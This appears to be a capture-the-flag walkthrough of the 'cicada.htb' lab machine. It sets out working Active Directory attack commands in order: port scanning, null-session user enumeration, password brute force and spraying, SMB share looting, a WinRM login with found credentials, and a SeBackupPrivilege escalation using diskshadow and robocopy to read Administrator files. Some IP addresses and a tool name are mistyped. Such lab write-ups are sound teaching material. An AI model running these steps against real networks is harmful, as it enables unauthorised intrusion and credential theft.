- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

  ```python
  nmap -p- --open -vvv --min-rate 5000 -Pn -sS 10.10.11.35 -oG scan
  /opt/extractports scan
  nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,51656 -sCV 10.10.11.35 -oN ports
  ```

- I found the domain `cicada.htb` and add it to the file in the `/etc/hosts` file
 
- By using a null session I manage to enumerate the users of the system. Valid if they really exist with kerbrute.

  ```python
  impacket-lookupsid cicada@10.10.10.35 -no-pass
  ```

  ![image](https://github.com/user-attachments/assets/8523b9b0-9014-463c-ba28-c2aeeed37d36)

    
- Validate the existence of users in the AD witch [kerbrute](https://github.com/ropnop/kerbrute)
    
    ```python
    ./kerbrute_linux_386 userenum --dc 10.10.11.35 -d cicada.htb -t 100 /home/rufo/users
    ```
    
    ![image](https://github.com/user-attachments/assets/7ebcc3a2-4cba-4d66-b251-687653ab8ace)
    
- I try with a brute force attack to get the passwords of the users but I get nothing.
    
    ```python
    crackmapexec smb 10.10.11.35 -u emily.oscars -p /usr/share/wordlist/rockyou.txt -k
    ./kerbrute_linux_386 bruteuser --dc 10.10.11.35 -d cicada.htb -t 100 -v /usr/share/wordlist/rockyou.txt Guest
    ```

- Having a list of valid users we can make an `ASREPRoast Attack` (without having passwords)
    
    - If the user does not require kerberos preauthentication (if Dont require preauth is set for the user) it will give us a TGT, we can try to break that hash and get the password in clear text.
    - But I see that no user has this option set.
    
    ```python
    impacket-GetNPUsers -no-pass -userfile /home/rufo/users cicada.htb/
    ```
    
    ![image](https://github.com/user-attachments/assets/4c0cfee3-a7df-4984-936e-3caea791e9dd)
    
- As I see port 53 open, I try to `enumerate server names`, `mail server names` and even perform a `zone transfer attack` but I get nothing relevant
    
    ```python
    dig @10.10.11.35 cicada.htb ns
    dig @10.10.11.35 cicada.htb mx
    dig @10.10.11.35 cicada.htb axfr
    ```

- Making use of a null session I list the resources shared by `smb` and I find a folder that catches my attention, `HR`
    
    ```python
    enum4linux -a -u "guest" -p '' 10.10.11.35
    smbmap -H 10.10.11.35 -u 'guest' -r HR
    ```

	![image](https://github.com/user-attachments/assets/e83f8303-a179-4d81-ae78-aa5456e2edf1)

- I find a file containing a possible password. Valid if it belongs to one of the users previously found.
    
    ```python
    smbmap -H 10.10.11.35 -u 'guest' --download 'HR/Notice from HR.txt'
    ```
    
    ![image](https://github.com/user-attachments/assets/f4c802ac-f296-4f93-9013-b18f8570fb87)
    
    ```python
    crackmapexec smb 10.10.11.35 -u ./users2 -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
    ```
    
    ![image](https://github.com/user-attachments/assets/5fd89c5c-02a7-48d1-bce5-e5d30818f96e)
    
- Following the found file I try to log in as the user michael.wrightson and the default password to try to change his password but I don't have permissions.
    
    ```python
    smbpasswd -r cicada.htb -U michael.wrightson
    net rpc password "michael.wrightson" -U "cicada.htb"/"michael.wrightson"%'Cicada$M6Corpb*@Lp#nZp!8' -S 10.10.11.35
    ```
    
    ![image](https://github.com/user-attachments/assets/f5ab2d72-6493-4625-92fc-104e606f046e)
    
    ![image](https://github.com/user-attachments/assets/790461f4-96d2-4fc0-b601-84c9d5684a0e)
    
- Having the credentials of the user `michael.wrightson`, I list resources shared by `smb` for this user
    
    ```python
    crackmapexec smb 10.10.10.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
    ```
    
    ![image](https://github.com/user-attachments/assets/47b0ba4a-6098-4d0c-8623-a0743a4d88bc)
    
- After entering the different folders and files I get nothing relevant. I use `enum4linux` again with the credentials of the found user and find a possible password in the description of a user and see that the user `emily.oscars` belongs to the `Remote Management Users` group.
    
    ```python
    enum4linux -a -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
    ```
    
    ![image](https://github.com/user-attachments/assets/26b10341-aba3-480c-9aad-1cb0c1197edc)
    
    ![image](https://github.com/user-attachments/assets/ba69adba-cd17-4424-ad28-7dc19bd5eab0)
    
- I list shared resources, find a file and download it to see its content.
    
    ```python
    crackmapexec smb 10.10.11.35 -u david.orelious -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
    smbclient -U 'david.orelious' //10.10.11.35/DEV
    ```

    ![image](https://github.com/user-attachments/assets/82453d0f-7108-421c-aca4-10e619e31d5c)
    
- I find the password of the user `emily.oscars`, I validate it with `crackmapexec` and it is correct. As we have seen before that this user belongs to the `Remote Management Users` group, we can connect with `evil-winrm` and we can read the first flag.
    
    ```python
    evil-wirm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35
    ```

- Using `neo4j`, `bloodhound` and `bloodhound-python` I can extract information from the system to see a way to escalate privileges.
    
- While I list the privileges I have and I see that I have the `SeBackupPrivilege` permission.
    
    ```python
    whoami /priv
    ```
    
    ![image](https://github.com/user-attachments/assets/1f665db4-e5f8-4bca-a5c1-753faffa9a52)
    
    - When searching for information about this [privilege](https://d4t4s3c.medium.com/sebackupprivilege-windows-privilege-escalation-c7a05e3f1568) I see that I can access all files on the system regardless of permissions.
        
    - Thanks to this we could read both the system and the sam and try to get the hash of the users but as the connection against the computer was restarted every few minutes, I did not have time to download the files to my local
        
    - Because of this, I decide to read directly the root.txt file
    
- I create a file test.txt with the following content and using [diskshadow](https://pentestlab.blog/tag/diskshadow/) I run the script that creates a new volume 'v' with the content of 'c'.
    
    ```python
    set context persistent nowriters
    add volume c: alias rufo
    create
    expose %rufo% v:
    ```
    
    ```python
    diskshadow.exe /s c:\\Temp\\test.txt
    ```

- Now using robocopy, since copy does not let me, I make a copy of any file called root.txt that is in the path v:\UsersAdministrator\Desktop and create it in the current directory, for that I indicate the '.'. Thanks to this I already have the content of the root.txt file
    
    ```python
    cd 	c:\\Temp
    robocopy /b v:\\Users\\Administrator\\Desktop\\ . root.txt
    ```
